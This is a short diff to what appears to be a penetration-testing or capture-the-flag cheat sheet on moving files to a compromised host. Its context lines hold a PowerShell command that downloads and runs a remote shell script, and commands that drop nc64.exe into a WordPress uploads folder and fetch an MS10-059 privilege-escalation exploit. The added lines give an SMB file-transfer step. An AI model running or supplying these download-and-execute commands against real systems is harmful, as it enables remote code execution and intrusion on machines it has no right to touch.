@@ -2,6 +2,7 @@
 
 ``` powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"  ```
 
+
 ``` powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.111/nc64.exe','C:\inetpub\wwwroot\wordpress\wp-content\uploads\temo.exe'); ```
 
 ```
@@ -10,7 +11,15 @@
 (new-object net.webclient).downloadfile('http://10.10.14.39/Churraskito_exe/MS10-059.exe', 'C:\Users\merlin\Desktop\MS10-059.exe')
 
 
-``
+```
+
+#SMB
+
+```
+start smbserver.py
+
+cp \\IP\tmp
+```
 
 # Linux
 
